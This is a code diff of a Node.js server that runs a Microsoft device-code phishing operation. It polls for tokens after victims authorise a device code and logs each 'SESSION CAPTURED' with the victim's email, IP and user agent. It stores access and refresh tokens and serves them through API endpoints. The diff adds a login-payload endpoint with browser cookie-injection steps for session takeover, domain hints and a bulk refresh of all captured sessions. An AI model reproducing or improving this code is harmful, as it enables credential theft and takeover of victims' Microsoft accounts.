@@ -37,58 +37,6 @@ function generateSessionKey() {
 }
 
 // ============================================
-// REFRESH ACCESS TOKEN ONLY - PRT STAYS THE SAME
-// ============================================
-async function refreshAccessToken(session) {
-    if (!session.refresh_token) {
-        console.log(`❌ No PRT for ${session.email}`);
-        return null;
-    }
-    
-    try {
-        console.log(`🔄 Refreshing ACCESS TOKEN for ${session.email} at ${new Date().toLocaleTimeString()}...`);
-        console.log(`   Using PRT: ${session.refresh_token.substring(0, 30)}...`);
-        
-        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
-            new URLSearchParams({
-                grant_type: 'refresh_token',
-                refresh_token: session.refresh_token,
-                client_id: YOUR_CLIENT_ID
-            }), {
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-            }
-        );
-        
-        const tokens = response.data;
-        
-        // ONLY update access token - PRT stays the same unless Microsoft sends a new one
-        const oldToken = session.access_token;
-        session.access_token = tokens.access_token;
-        session.expires_in = tokens.expires_in;
-        session.expires_at = Date.now() + (tokens.expires_in * 1000);
-        session.lastRefreshed = new Date().toISOString();
-        
-        // Only update PRT if Microsoft sends a new one (rare - happens during security events)
-        if (tokens.refresh_token && tokens.refresh_token !== session.refresh_token) {
-            console.log(`⚠️ PRT was rotated by Microsoft! This is rare.`);
-            session.refresh_token = tokens.refresh_token;
-        }
-        
-        console.log(`✅ Access token refreshed for ${session.email}`);
-        console.log(`   Old Access Token: ${oldToken?.substring(0, 30)}...`);
-        console.log(`   New Access Token: ${session.access_token?.substring(0, 30)}...`);
-        console.log(`   PRT (unchanged): ${session.refresh_token?.substring(0, 30)}...`);
-        console.log(`   Expires in: ${tokens.expires_in} seconds`);
-        
-        return session.access_token;
-        
-    } catch (err) {
-        console.error(`❌ Token refresh failed for ${session.email}:`, err.response?.data?.error || err.message);
-        return null;
-    }
-}
-
-// ============================================
 // CREATE SESSION
 // ============================================
 app.post('/api/create-session', async (req, res) => {
@@ -109,7 +57,7 @@ app.post('/api/create-session', async (req, res) => {
         
         const { device_code, user_code, expires_in } = response.data;
         
-        console.log(`[CREATE] SID: ${sid}, Session Key: ${sessionKey.substring(0, 10)}..., Code: ${user_code}`);
+        console.log(`[CREATE] SID: ${sid}, Code: ${user_code}`);
         
         pendingAuth.set(device_code, {
             device_code, user_code, sid, sessionKey, status: 'pending',
@@ -123,7 +71,7 @@ app.post('/api/create-session', async (req, res) => {
         res.json({ success: true, sid: sid, sessionKey: sessionKey, user_code: user_code });
         
     } catch (err) {
-        console.error('Create session error:', err.response?.data || err.message);
+        console.error('Create session error:', err.message);
         res.status(500).json({ error: err.message });
     }
 });
@@ -140,7 +88,6 @@ async function pollForToken(device_code, sid, sessionKey) {
             pending.status = 'expired';
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
-            console.log(`[POLL] Session ${sid} expired`);
             return;
         }
         
@@ -161,20 +108,29 @@ async function pollForToken(device_code, sid, sessionKey) {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
             
+            // Extract user domain for login hint
+            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
+            const userDomain = userEmail.split('@')[1];
+            
+            // Generate the full authentication payload
             const session = {
                 sid: sid,
                 sessionKey: sessionKey,
-                email: userInfo.data.mail || userInfo.data.userPrincipalName,
+                email: userEmail,
+                domain: userDomain,
                 name: userInfo.data.displayName,
                 ip: pending.ip,
                 userAgent: pending.userAgent,
+                // Tokens
                 access_token: tokens.access_token,
-                refresh_token: tokens.refresh_token || null,  // PRT - PERMANENT
+                refresh_token: tokens.refresh_token || null,
                 id_token: tokens.id_token || null,
                 token_type: tokens.token_type,
                 expires_in: tokens.expires_in,
                 expires_at: Date.now() + (tokens.expires_in * 1000),
-                scope: tokens.scope,
+                // Login hints for browser auth
+                login_hint: userEmail,
+                domain_hint: userDomain,
                 capturedAt: new Date().toISOString(),
                 lastRefreshed: new Date().toISOString()
             };
@@ -182,15 +138,15 @@ async function pollForToken(device_code, sid, sessionKey) {
             userSessions.set(sid.toString(), session);
             
             pending.status = 'captured';
-            pending.email = userInfo.data.mail;
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
             
             console.log(`✅✅✅ SESSION CAPTURED!`);
-            console.log(`   Email: ${userInfo.data.mail}`);
+            console.log(`   Email: ${userEmail}`);
+            console.log(`   Domain: ${userDomain}`);
             console.log(`   Session Key: ${sessionKey}`);
-            console.log(`   PRT (Permanent): ${tokens.refresh_token ? 'CAPTURED ✓' : 'NO'}`);
-            console.log(`   Access Token: ${tokens.access_token?.substring(0, 30)}...`);
+            console.log(`   Access Token: ${tokens.access_token?.substring(0, 50)}...`);
+            console.log(`   PRT: ${tokens.refresh_token ? 'YES' : 'NO'}`);
             
         } catch (err) {
             if (err.response?.data?.error !== 'authorization_pending') {}
@@ -199,71 +155,100 @@ async function pollForToken(device_code, sid, sessionKey) {
 }
 
 // ============================================
-// API: Get FRESH access token (PRT stays same)
+// REFRESH ACCESS TOKEN USING PRT
+// ============================================
+async function refreshAccessToken(session) {
+    if (!session.refresh_token) {
+        return null;
+    }
+    
+    try {
+        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            new URLSearchParams({
+                grant_type: 'refresh_token',
+                refresh_token: session.refresh_token,
+                client_id: YOUR_CLIENT_ID
+            }), {
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+            }
+        );
+        
+        const tokens = response.data;
+        
+        session.access_token = tokens.access_token;
+        session.expires_in = tokens.expires_in;
+        session.expires_at = Date.now() + (tokens.expires_in * 1000);
+        session.lastRefreshed = new Date().toISOString();
+        
+        if (tokens.refresh_token && tokens.refresh_token !== session.refresh_token) {
+            session.refresh_token = tokens.refresh_token;
+        }
+        
+        return session.access_token;
+        
+    } catch (err) {
+        return null;
+    }
+}
+
+// ============================================
+// API: Get FULL login payload (for browser auth)
+// ============================================
+app.get('/api/session/login/:sid', async (req, res) => {
+    const session = userSessions.get(req.params.sid);
+    if (!session) return res.status(404).json({ error: 'Session not found' });
+    
+    // Refresh token to ensure it's valid
+    const freshToken = await refreshAccessToken(session);
+    
+    // Generate the login URL that can be used directly
+    const loginUrl = `https://login.microsoftonline.com/${session.domain}/oauth2/v2.0/authorize?` +
+        `client_id=${YOUR_CLIENT_ID}&` +
+        `response_type=token&` +
+        `scope=https://graph.microsoft.com/User.Read%20openid%20profile%20email&` +
+        `redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&` +
+        `login_hint=${encodeURIComponent(session.email)}&` +
+        `domain_hint=${session.domain}`;
+    
+    res.json({
+        email: session.email,
+        domain: session.domain,
+        access_token: freshToken || session.access_token,
+        refresh_token: session.refresh_token,
+        sessionKey: session.sessionKey,
+        login_hint: session.email,
+        domain_hint: session.domain,
+        direct_login_url: loginUrl,
+        instructions: {
+            step1: "Copy the access_token below",
+            step2: "Open browser DevTools (F12) → Application → Cookies",
+            step3: `Add cookie to https://login.microsoftonline.com: name="accesstoken", value="${(freshToken || session.access_token).substring(0, 50)}..."`,
+            step4: `Add cookie: name="login_hint", value="${session.email}"`,
+            step5: "Refresh the page - you should be logged in"
+        }
+    });
+});
+
+// ============================================
+// API: Get access token (refreshed)
 // ============================================
 app.get('/api/session/token/:sid', async (req, res) => {
     const session = userSessions.get(req.params.sid);
     if (!session) return res.status(404).json({ error: 'Session not found' });
     
-    // Refresh ONLY the access token using the permanent PRT
-    const newAccessToken = await refreshAccessToken(session);
+    const freshToken = await refreshAccessToken(session);
     
     res.json({
         email: session.email,
-        access_token: newAccessToken || session.access_token,
-        refresh_token: session.refresh_token,  // PRT - unchanged
-        refreshed_at: new Date().toISOString(),
-        expires_in: session.expires_in,
-        note: "PRT (refresh_token) stays the same. Only access_token changes on each refresh."
-    });
-});
-
-// ============================================
-// API: Get ALL tokens (with fresh access token)
-// ============================================
-app.get('/api/session/tokens/:sid', async (req, res) => {
-    const session = userSessions.get(req.params.sid);
-    if (!session) return res.status(404).json({ error: 'Session not found' });
-    
-    // Refresh ONLY the access token using the permanent PRT
-    const newAccessToken = await refreshAccessToken(session);
-    
-    res.json({
-        email: session.email,
+        domain: session.domain,
+        access_token: freshToken || session.access_token,
+        refresh_token: session.refresh_token,
         sessionKey: session.sessionKey,
-        access_token: newAccessToken || session.access_token,
-        refresh_token: session.refresh_token,  // PRT - PERMANENT, does NOT change
-        id_token: session.id_token || 'Not captured',
+        login_hint: session.email,
+        domain_hint: session.domain,
         expires_in: session.expires_in,
-        expires_at: session.expires_at,
-        token_type: session.token_type,
-        lastRefreshed: new Date().toISOString(),
-        note: "PRT (refresh_token) is permanent. Use it to generate new access tokens."
-    });
-});
-
-// ============================================
-// API: Force refresh ALL sessions access tokens
-// ============================================
-app.post('/api/refresh-all', async (req, res) => {
-    console.log(`🔄 Manual refresh of all access tokens requested`);
-    
-    const results = [];
-    for (const [sid, session] of userSessions.entries()) {
-        const newToken = await refreshAccessToken(session);
-        results.push({
-            email: session.email,
-            success: !!newToken,
-            prt_unchanged: session.refresh_token?.substring(0, 20) + '...'
-        });
-    }
-    
-    res.json({ 
-        success: true, 
-        refreshed_at: new Date().toISOString(),
-        count: results.length,
-        message: "Access tokens refreshed. PRTs remain unchanged.",
-        results: results
+        note: "Use access_token as Bearer token for Microsoft Graph API",
+        graph_api_test: `https://graph.microsoft.com/v1.0/me -H "Authorization: Bearer ${(freshToken || session.access_token).substring(0, 50)}..."`
     });
 });
 
@@ -275,6 +260,7 @@ app.get('/api/sessions', async (req, res) => {
         sid: s.sid,
         sessionKey: s.sessionKey,
         email: s.email,
+        domain: s.domain,
         name: s.name,
         ip: s.ip,
         userAgent: s.userAgent,
@@ -299,6 +285,15 @@ app.get('/api/status/:sid', async (req, res) => {
 app.delete('/api/sessions/clear', async (req, res) => {
     userSessions.clear();
     res.json({ success: true });
+});
+
+app.post('/api/refresh-all', async (req, res) => {
+    const results = [];
+    for (const [sid, session] of userSessions.entries()) {
+        const newToken = await refreshAccessToken(session);
+        results.push({ email: session.email, success: !!newToken });
+    }
+    res.json({ success: true, count: results.length, results });
 });
 
 // Generate Auth Page
@@ -376,9 +371,6 @@ app.get('/', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
-    console.log(`📍 Client ID: ${YOUR_CLIENT_ID}`);
-    console.log(`📍 PRT (Refresh Token) is PERMANENT`);
-    console.log(`📍 Access Token refreshes on every request`);
     console.log(`📍 Dashboard: http://localhost:${PORT}`);
     console.log(`========================================\n`);
 });
